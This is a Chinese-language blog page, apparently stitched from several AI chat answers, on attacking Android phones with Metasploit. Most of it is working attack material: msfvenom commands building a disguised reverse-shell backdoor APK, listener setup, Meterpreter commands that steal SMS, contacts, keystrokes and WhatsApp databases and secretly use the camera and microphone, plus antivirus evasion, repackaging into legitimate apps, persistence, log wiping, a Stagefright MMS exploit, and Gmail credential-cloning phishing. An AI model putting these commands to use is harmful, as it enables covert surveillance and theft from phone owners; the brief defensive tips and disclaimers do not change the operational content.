wget <a href="https://raw.githubusercontent.com/TrustedSec/metasploit-framework/master/msfupdate" rel="nofollow">https://raw.githubusercontent.com/TrustedSec/metasploit-framework/master/msfupdate</a><br>
chmod +x msfupdate<br>
./msfupdate</p>
<p>但是，由于Metasploit对Ruby版本和依赖库的要求，以及在ARM架构上的兼容性，安装过程可能会遇到问题。因此，更推荐使用以下方法：</p>
<p>方法2：使用Metasploit的Docker镜像<br>
如果手机支持运行Docker（例如通过Termux安装Docker，或者使用其他容器环境），可以拉取Metasploit的Docker镜像来运行。</p>
<p>步骤：</p>
<p>在Termux中安装Docker（如果支持）。</p>
<p>拉取Metasploit镜像：docker pull metasploitframework/metasploit-framework</p>
<p>运行容器：docker run -it --network host metasploitframework/metasploit-framework</p>
<p>方法3：使用预编译的APK<br>
有一些项目将Metasploit打包成APK，例如“NetHunter”（Kali Linux for Android）。NetHunter是专为Nexus和OnePlus等设备定制的渗透测试平台，它包含了Metasploit。</p>
<p>步骤：</p>
<p>安装NetHunter（需要Root权限和特定设备支持）。</p>
<p>在NetHunter应用中启动Metasploit。</p>
<p>二、针对手机（Android）的渗透测试</p>
<p>生成Android Payload<br>
使用msfvenom生成一个Android后门程序。</p>
<p>在攻击机（可以是PC，也可以是手机上的Metasploit）上执行：<br>
msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;你的IP&gt; LPORT=&lt;端口&gt; R &gt; update.apk</p>
<p>然后将这个APK通过社会工程学方式诱骗目标安装并运行。</p>
<p>在Metasploit中设置监听<br>
启动msfconsole，然后：</p>
<p>text<br>
use exploit/multi/handler<br>
set PAYLOAD android/meterpreter/reverse_tcp<br>
set LHOST &lt;你的IP&gt;<br>
set LPORT &lt;端口&gt;<br>
exploit<br>
当目标运行APK后，就会建立一个Meterpreter会话。</p>
<p>Android Meterpreter的高级用法<br>
一旦建立会话，你可以执行很多操作，例如：</p>
<p>获取手机信息：sysinfo</p>
<p>获取位置信息：geolocate</p>
<p>读取短信：dump_sms</p>
<p>读取联系人：dump_contacts</p>
<p>打开摄像头：webcam_snap</p>
<p>录音：record_mic</p>
<p>发送短信：send_sms -d 电话号码 -t "消息内容"</p>
<p>拨打电话：dial -d 电话号码</p>
<p>注意：这些操作需要目标授予相应的权限，而恶意应用通常会通过欺骗方式获取这些权限。</p>
<p>三、高级玩法：持久化</p>
<p>在获取了Android的Meterpreter会话后，你可能希望持久化访问。由于Android系统机制，持久化比较困难，但可以尝试以下方法：</p>
<p>使用app_uuid模块将后门注入到其他应用。</p>
<p>利用设备管理员权限防止被卸载。</p>
<p>利用系统漏洞获取Root权限，然后替换系统应用。</p>
<p>但是，这些操作需要根据目标Android版本和设备型号具体分析，且可能涉及复杂的技术。</p>
<p>四、防范措施</p>
<p>作为用户，如何防范？</p>
<p>不要安装来自不可信来源的APK。</p>
<p>注意应用请求的权限，不要授予不必要的权限。</p>
<p>保持系统更新，以修补已知漏洞。</p>
<p>安装安全软件进行检测。</p>
<p>总结：</p>
<p>在手机场景下，Metasploit可以安装在手机上作为攻击平台，也可以用于生成针对手机的Payload。但由于手机性能、架构和系统限制，在手机上运行Metasploit可能不如在PC上方便。同时，针对手机的渗透测试需要社会工程学的配合，因为需要用户安装恶意应用。</p>
<p>请务必在合法和道德的前提下进行相关测试。</p>
<p>好的，我们来探讨一下 Metasploit 在移动安全领域，特别是针对手机场景的"高级玩法"。这个领域通常被称为移动设备渗透测试。</p>
<p>好的，我们来探讨一下 Metasploit 在移动安全领域，特别是针对手机场景的"高级玩法"。这个领域通常被称为<strong>移动设备渗透测试</strong>。</p>
<p><strong>重要声明：</strong></p>
<blockquote>
<p><strong>以下所有内容仅用于授权的安全测试、教育目的和个人学习。未经明确授权对任何设备进行测试都是非法的。请务必在您自己完全控制的实验室环境中进行实践。</strong></p>
</blockquote>
<hr>
<h3><strong>手机场景 Metasploit 高级玩法详解</strong></h3>
<p>与传统的计算机渗透测试相比，针对手机的测试有其独特之处，主要围绕<strong>社会工程学</strong>、<strong>应用漏洞</strong>和<strong>系统漏洞</strong>展开。</p>
<h4><strong>核心思路：攻击向量</strong></h4>
<p>针对手机的攻击主要有以下几种入口：</p>
<ol>
<li><strong>恶意应用 (Malicious Application)</strong>： 诱骗目标安装含有恶意负载的 APK (Android) 或 IPA (iOS)。</li>
<li><strong>网络攻击 (Network Attack)</strong>： 当目标连接到您控制的恶意 Wi-Fi 热点时，发起的中间人攻击。</li>
<li><strong>浏览器攻击 (Browser Exploit)</strong>： 诱骗目标访问一个包含浏览器漏洞的恶意网站。</li>
<li><strong>物理访问 (Physical Access)</strong>： 在短暂接触设备时，通过 USB 或其他方式植入负载。</li>
</ol>
<p>我们将重点介绍前两种最常用且"高级"的玩法。</p>
<hr>
<h3><strong>玩法一：生成恶意应用 (APK) - 社会工程学</strong></h3>
<p>这是最常见、最有效的手机攻击方式。核心工具是 <code class="notranslate">msfvenom</code>。</p>
<p><strong>步骤 1：生成 Android 后门 APK</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 Kali Linux 终端中，非 msfconsole 内</span>
msfvenom -p android/meterpreter/reverse_tcp LHOST=<span class="pl-k">&lt;</span>你的IP<span class="pl-k">&gt;</span> LPORT=<span class="pl-k">&lt;</span>监听端口<span class="pl-k">&gt;</span> R <span class="pl-k">&gt;</span> payload.apk

<span class="pl-c"><span class="pl-c">#</span> 示例</span>
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 R <span class="pl-k">&gt;</span> update.apk</pre></div>
<ul>
<li><code class="notranslate">-p android/meterpreter/reverse_tcp</code>： 指定使用 Android 的 Meterpreter 反向 TCP 负载。</li>
<li><code class="notranslate">LHOST</code>： 你的 Kali 机器的 IP 地址（公网 IP 如果目标在外部网络）。</li>
<li><code class="notranslate">LPORT</code>： 你准备监听的端口。</li>
<li><code class="notranslate">R &gt; payload.apk</code>： 输出为 APK 文件。这里命名为 <code class="notranslate">update.apk</code> 更具欺骗性。</li>
</ul>
<p><strong>步骤 2：对 APK 进行免杀处理 (高级技巧)</strong></p>
<p>默认生成的 APK 很容易被手机安全软件检测到。你需要进行"加壳"或"混淆"。</p>
<ul>
<li><strong>使用工具</strong>： <code class="notranslate">ApkEasyTool</code>, <code class="notranslate">Jadx</code> 进行反编译后代码混淆，再重新签名。</li>
<li><strong>在线平台</strong>： 使用一些在线的 APK 加壳平台（注意风险，你的后门可能会被平台收录）。</li>
<li><strong>使用分离负载</strong>： 让初始 APK 很小，只负责下载和执行真正的负载，从而绕过静态检测。</li>
</ul>
<p><strong>步骤 3：设置监听器</strong></p>
<p>在 Metasploit 中启动一个处理器，等待目标运行你的 APK。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 启动 msfconsole</span>
msfconsole

<span class="pl-c"><span class="pl-c">#</span> 使用多功能处理器模块</span>
use exploit/multi/handler

<span class="pl-c"><span class="pl-c">#</span> 设置Payload，必须和生成APK时使用的Payload完全一致</span>
<span class="pl-c1">set</span> PAYLOAD android/meterpreter/reverse_tcp

<span class="pl-c"><span class="pl-c">#</span> 设置参数</span>
<span class="pl-c1">set</span> LHOST 192.168.1.104
<span class="pl-c1">set</span> LPORT 4444

<span class="pl-c"><span class="pl-c">#</span> 开始监听</span>
exploit -j
<span class="pl-c"><span class="pl-c">#</span> `-j` 选项表示作为后台任务运行，这样你可以在前台执行其他命令。</span></pre></div>
<p><strong>步骤 4：诱骗安装</strong><br>
通过钓鱼邮件、短信、二维码、社交网络等方式，将 <code class="notranslate">update.apk</code> 发送给目标，并诱骗他/她点击安装。Android 用户需要开启"允许安装来自未知来源的应用"。</p>
<p><strong>步骤 5：后渗透控制</strong></p>
<p>一旦目标安装并运行了应用，你就会在 MSF 中获得一个 <code class="notranslate">meterpreter</code> 会话。以下是针对手机的专用命令：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 基础信息收集</span>
sysinfo          <span class="pl-c"><span class="pl-c">#</span> 查看手机型号、Android版本等</span>
app_list         <span class="pl-c"><span class="pl-c">#</span> 列出所有已安装的应用</span>

<span class="pl-c"><span class="pl-c">#</span> 权限提升 (尝试)</span>
exploit/android/local/... <span class="pl-c"><span class="pl-c">#</span> 搜索并使用Android本地提权漏洞</span>

<span class="pl-c"><span class="pl-c">#</span> 数据窃取</span>
dump_contacts    <span class="pl-c"><span class="pl-c">#</span> 导出所有联系人</span>
dump_sms         <span class="pl-c"><span class="pl-c">#</span> 导出所有短信</span>
dump_calllog     <span class="pl-c"><span class="pl-c">#</span> 导出通话记录</span>
webcam_list      <span class="pl-c"><span class="pl-c">#</span> 列出摄像头</span>
webcam_snap      <span class="pl-c"><span class="pl-c">#</span> 使用前置或后置摄像头拍照 (需要指定摄像头ID)</span>

<span class="pl-c"><span class="pl-c">#</span> 地理位置</span>
geolocate        <span class="pl-c"><span class="pl-c">#</span> 尝试获取GPS位置 (需要权限)</span>

<span class="pl-c"><span class="pl-c">#</span> 麦克风监控</span>
record_mic -d 10 <span class="pl-c"><span class="pl-c">#</span> 录制10秒麦克风音频</span>

<span class="pl-c"><span class="pl-c">#</span> UI控制</span>
send_sms -d 13800138000 -t <span class="pl-s"><span class="pl-pds">"</span>Hello from Meterpreter<span class="pl-pds">"</span></span> <span class="pl-c"><span class="pl-c">#</span> 发送短信</span></pre></div>
<hr>
<h3><strong>玩法二：恶意 Wi-Fi 热点 - 中间人攻击</strong></h3>
<p>这种玩法不需要目标安装任何应用，但需要他连接到你所控制的 Wi-Fi。</p>
<p><strong>步骤 1：搭建恶意热点</strong><br>
使用你的 Kali 机器创建一个 Wi-Fi 热点。可以用 <code class="notranslate">airbase-ng</code> 或更简单的工具如 <code class="notranslate">hostapd</code>。</p>
<p><strong>步骤 2：配置网络与流量转发</strong><br>
设置 IP 转发和 iptables 规则，将所有流量导向你的 Kali 机器。</p>
<p><strong>步骤 3：使用 <code class="notranslate">auxiliary/server/capture/http</code> 和 <code class="notranslate">https</code></strong><br>
在 MSF 中启动 HTTP 和 HTTPS 捕获服务，用于窃取通过 HTTP 明文传输的凭证。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">use auxiliary/server/capture/http
<span class="pl-c1">set</span> SRVHOST 0.0.0.0
<span class="pl-c1">set</span> SRVPORT 80
run -j

use auxiliary/server/capture/https
<span class="pl-c1">set</span> SRVHOST 0.0.0.0
<span class="pl-c1">set</span> SRVPORT 443
run -j</pre></div>
<p><strong>步骤 4：使用浏览器漏洞模块 (高级)</strong><br>
当目标通过你的热点上网时，你可以尝试使用浏览器漏洞进行攻击。例如，针对旧版 Android 浏览器的漏洞。</p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 搜索浏览器漏洞</span>
search android browser

<span class="pl-c"><span class="pl-c">#</span> 使用一个模块，例如（此为示例，具体模块需根据目标情况选择）</span>
use exploit/android/browser/stagefright_mp4_tx3g_64bit

<span class="pl-c"><span class="pl-c">#</span> 设置Payload和其他参数</span>
<span class="pl-c1">set</span> PAYLOAD android/meterpreter/reverse_tcp
<span class="pl-c1">set</span> LHOST 192.168.1.104
<span class="pl-c1">set</span> LPORT 5555
<span class="pl-c1">set</span> SRVHOST 192.168.1.104
<span class="pl-c1">set</span> SRVPORT 8080

<span class="pl-c"><span class="pl-c">#</span> 执行</span>
exploit -j</pre></div>
<p>这会生成一个恶意 URL。你需要通过 DNS 欺骗（如 <code class="notranslate">ettercap</code>）将目标的流量重定向到这个 URL，或者直接通过社会工程学让他访问这个链接。</p>
<hr>
<h3><strong>高级技巧与注意事项</strong></h3>
<ol>
<li>
<p><strong>端口转发与持久化</strong>：</p>
<ul>
<li>如果你的攻击机在内网，需要使用 <code class="notranslate">ngrok</code> 或 <code class="notranslate">serveo</code> 等工具进行端口转发，让公网的目标能回连到你。</li>
<li>使用 <code class="notranslate">persistence</code> 模块在 Android 设备上建立持久化后门。</li>
</ul>
</li>
<li>
<p><strong>规避检测</strong>：</p>
<ul>
<li><strong>APK 签名</strong>： 使用一个看似合法的证书对 APK 重新签名。</li>
<li><strong>权限最小化</strong>： 在生成 Payload 时，可以尝试移除一些敏感的 Android 权限，但可能会影响功能。</li>
<li><strong>动态行为</strong>： 让恶意应用在初始阶段表现正常，延迟执行恶意代码。</li>
</ul>
</li>
<li>
<p><strong>针对 iOS</strong>：</p>
<ul>
<li>针对 iOS 的渗透测试难度极高，通常需要：
<ul>
<li><strong>企业证书</strong>： 通过苹果的企业开发者账户签名应用，但容易被吊销。</li>
<li><strong>Jailbreak（越狱）</strong>： 主要针对已越狱设备，使用 <code class="notranslate">arm64</code> 的 Payload。</li>
<li><strong>Safari 漏洞</strong>： 利用未修补的 iOS Safari 浏览器漏洞，但这些漏洞非常珍贵且很快会被修复。</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>道德与法律红线</strong>：</p>
<ul>
<li>始终确保你有<strong>书面授权</strong>。</li>
<li>在测试结束后，<strong>务必帮助客户清理后门和恶意应用</strong>。</li>
<li>明确测试范围，不能逾越。</li>
</ul>
</li>
</ol>
<h3><strong>总结</strong></h3>
<p>手机场景的高级玩法核心在于 <strong>"诱骗"</strong> 和 <strong>"隐蔽"</strong>。</p>
<ul>
<li><strong>社会工程学</strong>是打开大门的钥匙。</li>
<li><strong>免杀技术</strong>是延长访问寿命的关键。</li>
<li><strong>移动设备专用的 Meterpreter 命令</strong>让你能深度操控目标手机。</li>
</ul>
<p>要精通此道，你不仅需要熟悉 Metasploit，还需要了解 Android/iOS 应用开发、网络协议、社会工程学以及最新的漏洞信息。这是一个持续学习和实践的领域。</p>
<p>我们继续深入探讨手机场景下的高级玩法，这里我们将介绍更多后渗透阶段的高级技巧，以及如何维持访问和隐藏踪迹。</p>
<p>后渗透阶段的高级技巧<br>
一旦通过上述方法获得了一个Meterpreter会话，我们可以进行以下高级操作：</p>
<ol>
<li>权限提升（Privilege Escalation）<br>
在Android中，通常我们获得的权限是有限的，因为Android应用运行在沙箱中。但是，我们可以尝试利用系统漏洞来提升权限。</li>
</ol>
<p>使用Android本地提权漏洞：在Metasploit中，有一些模块可以帮助我们提升权限。例如，exploit/android/local/目录下有一些提权模块。你可以搜索并尝试使用。</p>
<p>bash</p>
<h1>在Meterpreter会话中，你可以使用以下命令来尝试自动提权</h1>
<p>meterpreter &gt; getsystem<br>
但是，在Android上，getsystem通常不适用。因此，我们需要使用专门的Android提权模块。</p>
<p>bash</p>
<h1>背景化当前的Meterpreter会话</h1>
<p>meterpreter &gt; background</p>
<h1>搜索Android提权模块</h1>
<p>msf6 &gt; search android local</p>
<h1>选择一个提权模块，例如（注意：选择适合目标系统版本的模块）</h1>
<p>msf6 &gt; use exploit/android/local/...</p>
<h1>设置会话（将当前会话作为攻击目标）</h1>
<p>msf6 &gt; set SESSION &lt;session_id&gt;</p>
<h1>执行提权</h1>
<p>msf6 &gt; exploit<br>
如果提权成功，你将获得一个具有更高权限的会话。</p>
<ol start="2">
<li>数据提取<br>
在获得足够权限后，我们可以提取更多敏感数据。</li>
</ol>
<p>提取短信、联系人、通话记录：使用Meterpreter内置命令。</p>
<p>提取社交媒体数据：对于某些应用（如WhatsApp、Telegram），如果设备已root，我们可以尝试提取其数据库文件。这通常需要知道应用数据存储的路径。</p>
<p>bash</p>
<h1>在Meterpreter中，你可以使用以下命令来搜索文件</h1>
<p>meterpreter &gt; search -f "*.db" -d /data/data/com.whatsapp/</p>
<h1>下载找到的数据库文件</h1>
<p>meterpreter &gt; download /data/data/com.whatsapp/databases/msgstore.db /tmp/<br>
提取键盘记录：使用Meterpreter的keyscan功能，但需要先启动键盘记录器。</p>
<p>bash</p>
<h1>在Meterpreter中</h1>
<p>meterpreter &gt; keyscan_start<br>
meterpreter &gt; keyscan_dump<br>
meterpreter &gt; keyscan_stop<br>
3. 实时监控<br>
麦克风监听：使用record_mic命令录制音频。</p>
<p>摄像头拍照：使用webcam_snap命令拍照。</p>
<p>视频录制：使用webcam_stream命令开启实时视频流。</p>
<ol start="4">
<li>持久化（Persistence）<br>
为了在设备重启后仍然保持访问，我们需要建立持久化后门。</li>
</ol>
<p>使用Metasploit的持久化模块：</p>
<p>bash</p>
<h1>背景化当前会话</h1>
<p>meterpreter &gt; background</p>
<h1>搜索Android持久化模块</h1>
<p>msf6 &gt; search android persistence</p>
<h1>使用一个持久化模块，例如：</h1>
<p>msf6 &gt; use exploit/android/local/persistence</p>
<h1>设置会话和Payload参数</h1>
<p>msf6 &gt; set SESSION &lt;session_id&gt;<br>
msf6 &gt; set LHOST &lt;你的IP&gt;<br>
msf6 &gt; set LPORT &lt;新的端口&gt;</p>
<h1>执行</h1>
<p>msf6 &gt; exploit<br>
这个模块会在设备上安装一个应用，并在开机时自动启动，连接回攻击者。</p>
<p>使用其他持久化技术：例如，利用系统启动脚本、计划任务等（需要root权限）。</p>
<ol start="5">
<li>隐藏踪迹<br>
清除日志：在Android中，应用日志通常位于/data/system/dropbox或/data/anr等目录，但需要root权限才能访问。我们可以删除这些日志。</li>
</ol>
<p>卸载应用：如果通过恶意应用获得访问，在建立持久化后，可以卸载初始应用以隐藏。</p>
<p>玩法三：利用已知漏洞攻击移动设备系统服务<br>
除了上述方法，我们还可以利用Android系统服务或预装应用中的漏洞进行攻击。这些漏洞通常影响系统组件，可能不需要用户交互。</p>
<p>例如，利用著名的Stagefright漏洞（<a title="CVE-2015-1538" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-9662-qxrh-f9g6/hovercard" href="https://github.com/advisories/GHSA-9662-qxrh-f9g6">CVE-2015-1538</a>），通过发送一条特制的MMS短信就可以触发，用户甚至不需要查看短信。</p>
<p>在Metasploit中，有相应的模块：</p>
<p>bash<br>
msf6 &gt; use exploit/android/mms/sstagefright</p>
<h1>设置Payload和参数</h1>
<p>msf6 &gt; set PAYLOAD android/meterpreter/reverse_tcp<br>
msf6 &gt; set LHOST &lt;你的IP&gt;<br>
msf6 &gt; set LPORT &lt;端口&gt;</p>
<h1>设置目标手机号码</h1>
<p>msf6 &gt; set TARGETPHONE &lt;目标手机号&gt;</p>
<h1>发送MMS（需要配置一个可用的MMS网关）</h1>
<p>msf6 &gt; exploit<br>
注意事项<br>
免杀技术：随着手机安全软件的升级，生成的Payload很容易被检测到。因此，需要持续研究免杀技术，如代码混淆、加密、使用合法应用加壳等。</p>
<p>网络环境：确保你的监听器设置正确，特别是当使用公网IP时，需要配置端口转发。</p>
<p>法律和道德：再次强调，未经授权进行这些测试是非法的。</p>
<p>总结<br>
手机场景下的高级渗透测试是一个综合性的领域，涉及社会工程学、移动应用开发、系统漏洞和网络攻击等多方面知识。通过Metasploit框架，我们可以高效地完成从攻击到后渗透的整个流程。然而，这也要求渗透测试人员不断学习新的技术和漏洞，以应对日益增强的安全防护。</p>
<p>请务必在合法授权的环境中进行练习，并保护好个人隐私和数据安全。</p>
<p>好的，我们继续深入探讨手机场景下更高级、更隐蔽的玩法。这些技术需要更深入的理解和更谨慎的操作。</p>
<p>好的，我们继续深入探讨手机场景下更高级、更隐蔽的玩法。这些技术需要更深入的理解和更谨慎的操作。</p>
<hr>
<h3><strong>玩法三：无文件攻击与内存驻留</strong></h3>
<p>传统的 APK 安装方式会在设备上留下明显的应用图标和安装记录。高级攻击者会尽量避免这种情况。</p>
<p><strong>1. 利用已知漏洞实现无文件执行</strong></p>
<p>寻找 Android 系统组件或预装应用中的漏洞，通过特制的 Intent、恶意文件（如图片、PDF）或网络请求触发漏洞，直接在内存中加载并执行 Meterpreter 负载，无需安装 APK。</p>
<ul>
<li><strong>示例：利用 Stagefright 漏洞 (<a title="CVE-2015-1538" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-9662-qxrh-f9g6/hovercard" href="https://github.com/advisories/GHSA-9662-qxrh-f9g6">CVE-2015-1538</a>)</strong>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 搜索相关模块</span>
search stagefright

<span class="pl-c"><span class="pl-c">#</span> 使用一个模块</span>
use exploit/android/browser/stagefright_mp4_tx3g

<span class="pl-c"><span class="pl-c">#</span> 设置参数</span>
<span class="pl-c1">set</span> PAYLOAD android/meterpreter/reverse_tcp
<span class="pl-c1">set</span> LHOST 你的IP
<span class="pl-c1">set</span> SRVHOST 你的IP
<span class="pl-c1">set</span> SRVPORT 8080

<span class="pl-c"><span class="pl-c">#</span> 生成恶意链接</span>
exploit -j</pre></div>
将生成的链接发送给目标，当目标点击链接（甚至在旧版 Android 上可能自动预览恶意视频）时，漏洞被触发，Meterpreter 直接在内存中运行。</li>
</ul>
<p><strong>2. 注入到合法进程</strong><br>
这是一种更高级的技术，目标是将恶意代码注入到正在运行的、受信任的系统进程（如 <code class="notranslate">com.android.phone</code>）中。</p>
<ul>
<li><strong>工具</strong>： 这通常需要结合其他工具或自定义的 Exploit，而非 Metasploit 开箱即用。思路是获得一个初始 Shell 后，使用 <code class="notranslate">ptrace</code> 或 <code class="notranslate">dlopen</code> 等技术将库注入到目标进程。</li>
<li><strong>优势</strong>： 隐蔽性极高，难以被常规安全软件检测，并且权限通常与目标进程一致（可能是系统权限）。</li>
</ul>
<hr>
<h3><strong>玩法四：结合其他工具进行自动化攻击</strong></h3>
<p>Metasploit 可以与其他强大的工具链结合，形成自动化攻击平台。</p>
<p><strong>1. The Social-Engineer Toolkit (SET) 集成</strong><br>
SET 是社会工程学攻击的集大成者，它与 Metasploit 无缝集成，能自动化生成钓鱼网站、恶意文件等。</p>
<ul>
<li><strong>场景：创建凭证 harvesting 攻击</strong>
<ol>
<li>启动 SET：<code class="notranslate">setoolkit</code></li>
<li>选择 <code class="notranslate">1) Social-Engineering Attacks</code></li>
<li>选择 <code class="notranslate">2) Website Attack Vectors</code></li>
<li>选择 <code class="notranslate">3) Credential Harvester Attack Method</code></li>
<li>选择 <code class="notranslate">2) Site Cloner</code></li>
<li>设置你的 Kali IP，并输入要克隆的网站（如 <code class="notranslate">http://www.gmail.com</code>）。</li>
<li>当目标通过你的网络（恶意 Wi-Fi）访问 Gmail 时，SET 会呈现一个克隆的登录页面，捕获他们输入的用户名和密码。</li>
<li><strong>同时</strong>，你可以运行浏览器漏洞攻击模块（如玩法二所述），尝试在目标登录时获得一个 Meterpreter 会话。</li>
</ol>
</li>
</ul>
<p><strong>2. 使用 Beef-XSS 进行钩子攻击</strong><br>
BeEF (The Browser Exploitation Framework) 专门用于攻击 Web 浏览器。</p>
<ul>
<li><strong>工作流</strong>：
<ol>
<li>启动 BeEF：<code class="notranslate">beef-xss</code></li>
<li>在 SET 或你自己搭建的恶意网站中，插入 BeEF 的钩子脚本（<code class="notranslate">hook.js</code>）。</li>
<li>当目标的手机浏览器访问该网站时，会被 BeEF "钩住"。</li>
<li>在 BeEF 控制台中，你可以看到在线的浏览器，并执行数百种命令，如：
<ul>
<li>获取地理位置。</li>
<li>启动摄像头和麦克风（需要用户交互）。</li>
<li>窃取 Cookie 和会话。</li>
<li>发起 CSRF 攻击。</li>
<li>如果发现浏览器有漏洞，可以 <strong>"传递"</strong> 给 Metasploit：在 BeEF 中，可以直接发起一个到 Metasploit 负载的请求，从而在目标手机上获得一个 Meterpreter 会话。</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<h3><strong>玩法五：高级持久化与隐蔽通信</strong></h3>
<p>获得初始访问只是第一步，维持访问并保持隐蔽才是关键。</p>
<p><strong>1. 移动设备持久化技术</strong><br>
在 Meterpreter 的 <code class="notranslate">android</code> 命令中，有 <code class="notranslate">interval</code> 和 <code class="notranslate">job</code> 相关的命令，但功能有限。更高级的持久化需要：</p>
<ul>
<li><strong>利用 Android 开机自启动机制</strong>： 修改系统启动脚本（需要 root 权限），或者在 <code class="notranslate">/system/app/</code> 目录下植入恶意应用（需要 system 分区写入权限）。</li>
<li><strong>利用应用组件</strong>： 在恶意 APK 中注册 <code class="notranslate">BroadcastReceiver</code> 来监听系统事件（如开机完成、网络状态变化），从而重新激活负载。</li>
<li><strong>使用 <code class="notranslate">wakelock</code></strong>： 防止手机进入深度睡眠，保持连接。</li>
</ul>
<p><strong>2. 使用 HTTPS 或 DNS 隧道</strong><br>
默认的 <code class="notranslate">reverse_tcp</code> 流量是明文的，容易被检测。使用更隐蔽的传输方式：</p>
<ul>
<li><strong>HTTPS Payload</strong>：
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 使用 reverse_https 负载</span>
msfvenom -p android/meterpreter/reverse_https LHOST=your-domain.com LPORT=443 R <span class="pl-k">&gt;</span> payload.apk</pre></div>
这样所有通信都会加密在 HTTPS 流量中，看起来像正常的 Web 流量。</li>
<li><strong>DNS 隧道</strong>： 这是一种极其隐蔽的技术，所有通信都通过 DNS 查询和响应完成。即使在严格限制的网络中，DNS 请求也通常被允许。Metasploit 有相应的 <code class="notranslate">reverse_dns</code> 负载和 <code class="notranslate">auxiliary/server/dns_tunneling</code> 模块。</li>
</ul>
<hr>
<h3><strong>玩法六：针对特定应用的攻击</strong></h3>
<p>现代人大部分时间花在社交、购物、银行等应用上。针对这些应用进行攻击往往成功率更高。</p>
<p><strong>1. 创建钓鱼应用</strong><br>
使用 <code class="notranslate">msfvenom</code> 生成负载后，可以使用如 <code class="notranslate">APKTool</code> 等工具反编译一个流行的合法应用（如一个游戏或工具），将你的负载代码植入其中，然后重新编译和签名。这种"加壳"的应用更难被用户怀疑。</p>
<p><strong>2. 中间人攻击 (MitM) 应用数据</strong><br>
当目标连接到你的恶意 Wi-Fi 后，你可以使用 <code class="notranslate">mitmproxy</code> 等工具解密和分析手机应用的 HTTPS 流量（需要先在目标手机上安装你的 CA 证书，这可以通过社会工程学或已获得的 Meterpreter 会话来完成）。你可以：</p>
<ul>
<li>窃取 API 令牌和会话 Cookie。</li>
<li>修改应用发送或接收的数据（如篡改转账金额）。</li>
<li>发现并利用应用自身的漏洞。</li>
</ul>
<hr>
<h3><strong>防御与检测建议（蓝队视角）</strong></h3>
<p>了解攻击手法是为了更好的防御。</p>
<ol>
<li>
<p><strong>对于用户</strong>：</p>
<ul>
<li><strong>永不安装未知来源的应用</strong>： 在设置中关闭"允许未知来源"。</li>
<li><strong>警惕可疑链接</strong>： 不点击短信、邮件中的不明链接。</li>
<li><strong>使用可信网络</strong>： 避免连接公共的、无密码的 Wi-Fi。</li>
<li><strong>保持系统与应用更新</strong>： 及时修补安全漏洞。</li>
</ul>
</li>
<li>
<p><strong>对于组织</strong>：</p>
<ul>
<li><strong>移动设备管理 (MDM)</strong>： 强制执行安全策略，监控异常行为。</li>
<li><strong>网络监控</strong>： 使用 IDS/IPS 检测异常的出站连接（如到未知 IP 的 Reverse TCP 连接）。</li>
<li><strong>应用审查</strong>： 只允许从官方商店或经过审批的内部商店安装应用。</li>
<li><strong>定期渗透测试</strong>： 聘请专业团队使用上述方法测试自身移动应用和基础设施的安全性。</li>
</ul>
</li>
</ol>
<h3><strong>总结</strong></h3>
<p>手机场景的高级玩法已经从简单的"生成 APK"演变为一个复杂的、多阶段的攻击链：<br>
<strong>初始入侵</strong> (社会工程学/漏洞) → <strong>权限提升</strong> → <strong>横向移动/数据窃取</strong> → <strong>持久化</strong> → <strong>隐蔽通信</strong>。</p>
<p>掌握这些技术需要你不仅精通 Metasploit，还要熟悉移动操作系统原理、网络协议、加密技术和社会工程学。这是一个充满挑战但极具价值的网络安全领域。请务必在合法、合规的环境下运用这些知识。</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://binghey.github.io/blog">知行合一笔记</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 